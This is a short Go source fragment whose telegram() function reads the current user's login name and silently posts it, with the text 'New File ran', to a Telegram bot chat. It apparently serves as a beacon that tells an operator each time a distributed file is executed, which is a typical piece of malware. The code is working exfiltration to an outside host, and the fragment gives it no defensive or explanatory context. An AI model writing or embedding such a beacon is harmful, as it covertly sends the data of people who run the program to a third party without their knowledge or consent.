package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os/user"
)

func telegram() {

	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	message := ("New File ran, Username:" + user.Username + "\n")
	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
	data := url.Values{}
	data.Set("chat_id", chatid)
	data.Set("text", message)
	resp, err := http.PostForm(telegramurl, data)
	if err != nil {
		fmt.Println("failed too send info too telegram", err)
	}
	defer resp.Body.Close()
}
